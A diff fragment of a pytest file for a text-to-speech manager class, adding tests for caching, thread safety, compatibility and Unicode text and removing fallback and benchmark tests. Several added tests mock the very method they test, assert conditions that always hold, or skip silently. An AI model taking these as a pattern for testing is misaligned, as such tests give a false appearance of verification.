+        config = {'enable_cache': True, 'cache_size': 100}
+        return TTSManager(config=config)
+    
+    def test_audio_caching_basic(self, tts_manager):
+        """Test basic audio caching functionality."""
+        if hasattr(tts_manager, 'enable_cache'):
+            tts_manager.enable_cache(True)
+            
+            text = "Cached synthesis test"
+            
+            with patch.object(tts_manager, 'synthesize_speech', return_value=b'cached_audio') as mock_synth:
+                # First call should trigger synthesis
+                result1 = tts_manager.synthesize_speech(text)
+                
+                # Second call should use cache
+                result2 = tts_manager.synthesize_speech(text)
+                
+                assert result1 == result2
+                # Should only call synthesis once if caching works
+                if hasattr(tts_manager, '_cache'):
+                    assert mock_synth.call_count <= 2
+    
+    def test_cache_size_limits(self, tts_manager):
+        """Test cache size limiting functionality."""
+        if hasattr(tts_manager, 'set_cache_size'):
+            tts_manager.set_cache_size(2)  # Very small cache
+            
+            texts = ["Text 1", "Text 2", "Text 3"]
+            
+            with patch.object(tts_manager, 'synthesize_speech', return_value=b'audio'):
+                for text in texts:
+                    tts_manager.synthesize_speech(text)
+                
+                if hasattr(tts_manager, 'get_cache_size'):
+                    cache_size = tts_manager.get_cache_size()
+                    assert cache_size <= 2
+    
+    def test_cache_invalidation(self, tts_manager):
+        """Test cache invalidation functionality."""
+        if hasattr(tts_manager, 'clear_cache'):
+            text = "Cache invalidation test"
+            
+            with patch.object(tts_manager, 'synthesize_speech', return_value=b'audio'):
+                tts_manager.synthesize_speech(text)
+                tts_manager.clear_cache()
+                
+                if hasattr(tts_manager, 'get_cache_size'):
+                    assert tts_manager.get_cache_size() == 0
+    
+    def test_cache_hit_rate_tracking(self, tts_manager):
+        """Test cache hit rate tracking."""
+        if hasattr(tts_manager, 'get_cache_stats'):
+            text = "Cache hit rate test"
+            
+            with patch.object(tts_manager, 'synthesize_speech', return_value=b'audio'):
+                # Multiple calls to same text
+                for _ in range(5):
+                    tts_manager.synthesize_speech(text)
+                
+                stats = tts_manager.get_cache_stats()
+                if stats:
+                    assert 'hit_rate' in stats or 'hits' in stats
+                    assert isinstance(stats.get('hit_rate', 0), (int, float))
+
+
+class TestTTSManagerMultithreadingSafety:
+    """Test suite for multithreading safety"""
+    
+    @pytest.fixture
+    def tts_manager(self):
+        return TTSManager()
+    
+    def test_thread_safety_concurrent_synthesis(self, tts_manager):
+        """Test thread safety during concurrent synthesis operations."""
+        import threading
+        import queue
+        
+        results = queue.Queue()
+        errors = queue.Queue()
+        
+        def synthesis_worker(text, worker_id):
+            try:
+                with patch.object(tts_manager, 'synthesize_speech', return_value=f'audio_{worker_id}'.encode()):
+                    result = tts_manager.synthesize_speech(f"{text} {worker_id}")
+                    results.put((worker_id, result))
+            except Exception as e:
+                errors.put((worker_id, e))
+        
+        # Start multiple threads
+        threads = []
+        for i in range(5):
+            thread = threading.Thread(target=synthesis_worker, args=("Thread test", i))
+            threads.append(thread)
+            thread.start()
+        
+        # Wait for all threads to complete
+        for thread in threads:
+            thread.join(timeout=10)
+        
+        # Check results
+        assert results.qsize() <= 5  # All threads should complete
+        assert errors.qsize() == 0   # No errors should occur
+    
+    def test_configuration_thread_safety(self, tts_manager):
+        """Test thread safety of configuration changes."""
+        import threading
+        
+        def config_changer():
+            if hasattr(tts_manager, 'update_config'):
+                for i in range(10):
+                    tts_manager.update_config({'test_param': i})
+        
+        threads = []
+        for _ in range(3):
+            thread = threading.Thread(target=config_changer)
+            threads.append(thread)
+            thread.start()
+        
+        for thread in threads:
+            thread.join(timeout=5)
+        
+        # Should complete without deadlocks or exceptions
+        assert True
+
+
+class TestTTSManagerCompatibilityAndIntegration:
+    """Test suite for compatibility and integration scenarios"""
+    
+    def test_python_version_compatibility(self):
+        """Test compatibility across Python versions."""
+        import sys
+        
+        # Test should work on supported Python versions
+        assert sys.version_info >= (3, 7), "Python 3.7+ required"
+        
+        # Test instantiation
+        manager = TTSManager()
+        assert manager is not None
+    
+    def test_dependency_version_compatibility(self):
+        """Test compatibility with different dependency versions."""
+        try:
+            import pkg_resources
+            
+            # Check for key dependencies if they exist
+            dependencies = ['numpy', 'torch', 'torchaudio', 'gtts']
+            
+            for dep in dependencies:
+                try:
+                    version = pkg_resources.get_distribution(dep).version
+                    # Just check that version can be retrieved
+                    assert isinstance(version, str)
+                    assert len(version) > 0
+                except pkg_resources.DistributionNotFound:
+                    # Dependency not installed, skip
+                    continue
+                    
+        except ImportError:
+            # pkg_resources not available, skip test
+            pytest.skip("pkg_resources not available")
+    
+    def test_os_compatibility(self):
+        """Test OS compatibility."""
+        import platform
+        
+        os_name = platform.system()
+        
+        # Test should work on major operating systems
+        assert os_name in ['Windows', 'Darwin', 'Linux'], f"Unsupported OS: {os_name}"
+        
+        # Test basic functionality
+        manager = TTSManager()
+        with patch.object(manager, 'synthesize_speech', return_value=b'os_test_audio'):
+            result = manager.synthesize_speech("OS compatibility test")
+            assert result is not None
+    
+    def test_unicode_text_handling(self):
+        """Test handling of various Unicode text inputs."""
         manager = TTSManager()
         
-        # Check for cleanup/disposal methods
-        cleanup_methods = ['close', 'cleanup', 'dispose', 'shutdown', '__del__']
-        available_cleanup = []
-        
-        for method in cleanup_methods:
-            if hasattr(manager, method):
-                available_cleanup.append(method)
-        
-        # Test cleanup methods if available
-        for method in available_cleanup:
-            try:
-                cleanup_func = getattr(manager, method)
-                if callable(cleanup_func):
-                    cleanup_func()
-            except Exception:
-                # Cleanup methods might raise exceptions in test environment
-                pass
-        
-        # Manager should still be in a valid state after cleanup attempts
-        assert hasattr(manager, 'config') or hasattr(manager, 'tts_service_name')
-    
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    def test_manager_reinitialization_scenarios(self, mock_gtts, mock_ensure_dirs):
-        """Test various reinitialization scenarios"""
-        # Test reinitialization with same parameters
-        manager1 = TTSManager(tts_service_name="gtts", language="en")
-        manager2 = TTSManager(tts_service_name="gtts", language="en")
-        
-        assert manager1.tts_service_name == manager2.tts_service_name
-        assert manager1.language == manager2.language
-        
-        # Test reinitialization with different parameters
-        manager3 = TTSManager(tts_service_name="gtts", language="es")
-        
-        assert manager1.tts_service_name == manager3.tts_service_name
-        assert manager1.language != manager3.language
-
-
-class TestTTSManagerCompatibilityAndFallbacks:
-    """Test suite for compatibility and fallback mechanisms"""
-    
-    @patch('tts_manager.gtts', None)
-    @patch('tts_manager.CoquiTTS', None)
-    def test_no_services_available_fallback(self):
-        """Test behavior when no TTS services are available"""
-        try:
-            manager = TTSManager(tts_service_name="gtts")
-            # Should either initialize with graceful degradation or raise appropriate error
-            assert hasattr(manager, 'tts_service_name')
-        except (ImportError, RuntimeError, NotImplementedError, ModuleNotFoundError):
-            # These exceptions are acceptable when no services are available
-            pass
-    
-    @patch('tts_manager.ensure_client_directories')
-    def test_graceful_degradation_unsupported_features(self, mock_ensure_dirs):
-        """Test graceful degradation when features are unavailable"""
-        manager = TTSManager(tts_service_name="nonexistent_service")
-        
-        # Should not crash during initialization
-        assert manager is not None
-        
-        # Test that unsupported operations fail gracefully
-        unsupported_operations = [
-            lambda: asyncio.run(manager.synthesize("Test", "output.mp3")),
-            lambda: manager.synthesize_speech("Test") if hasattr(manager, 'synthesize_speech') else None,
+        unicode_texts = [
+            "Hello, 世界!",           # Mixed English/Chinese
+            "Café naïve résumé",      # Accented characters
+            "Москва",                 # Cyrillic
+            "こんにちは",                # Japanese
+            "🙂😊🎉",                  # Emojis
+            "العربية",                # Arabic
+            "हिन्दी",                  # Hindi
         ]
         
-        for operation in unsupported_operations:
-            if operation:
+        for text in unicode_texts:
+            with patch.object(manager, 'synthesize_speech', return_value=b'unicode_audio'):
                 try:
-                    operation()
-                except (NotImplementedError, ValueError, AttributeError, RuntimeError):
-                    # These are acceptable exceptions for unsupported operations
-                    pass
-    
-    def test_version_compatibility_if_available(self):
-        """Test version compatibility checking if implemented"""
-        version_methods = ['get_version', 'check_compatibility', '__version__']
-        
-        for method in version_methods:
-            if hasattr(TTSManager, method):
-                try:
-                    version_info = getattr(TTSManager, method)
-                    if callable(version_info):
-                        result = version_info()
-                        assert result is not None
-                    else:
-                        assert isinstance(version_info, str)
-                except (NotImplementedError, AttributeError):
-                    # Version methods might not be fully implemented
-                    pass
+                    result = manager.synthesize_speech(text)
+                    assert result is not None
+                except (UnicodeError, ValueError):
+                    # Some TTS engines might not support all Unicode
+                    continue
 
 
-class TestTTSManagerBenchmarkAndPerformance:
-    """Optional benchmark tests for performance validation"""
-    
-    @pytest.mark.benchmark
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    def test_synthesis_performance_benchmark(self, mock_gtts, mock_ensure_dirs):
-        """Benchmark synthesis performance for multiple operations"""
-        manager = TTSManager(tts_service_name="gtts")
-        
-        start_time = time.time()
-        
-        with patch.object(manager, 'synthesize_speech', return_value=b'benchmark_audio'):
-            for i in range(10):
-                result = manager.synthesize_speech(f"Benchmark text {i}")
-                assert result == b'benchmark_audio'
-        
-        end_time = time.time()
-        duration = end_time - start_time
-        
-        # Should complete 10 syntheses reasonably quickly
-        assert duration < 5.0  # 5 seconds max for 10 operations
-    
-    @pytest.mark.benchmark
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    async def test_concurrent_synthesis_benchmark(self, mock_gtts, mock_ensure_dirs):
-        """Benchmark concurrent synthesis performance"""
-        manager = TTSManager(tts_service_name="gtts")
-        
-        start_time = time.time()
-        
-        with patch('asyncio.to_thread', return_value=None):
-            tasks = [
-                manager.synthesize(f"Concurrent benchmark text {i}", f"output_{i}.mp3")
-                for i in range(5)
-            ]
-            
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            
-        end_time = time.time()
-        duration = end_time - start_time
-        
-        # Concurrent operations should complete efficiently
-        assert duration < 3.0
-        assert len(results) == 5
-        
-        # Count successful operations
-        success_count = sum(1 for r in results if not isinstance(r, Exception))
-        assert success_count >= 3  # Allow for some potential failures
+if __name__ == "__main__":
+    # Run with additional verbosity and coverage reporting
+    pytest.main([__file__, "-v", "--tb=short", "--maxfail=5"])
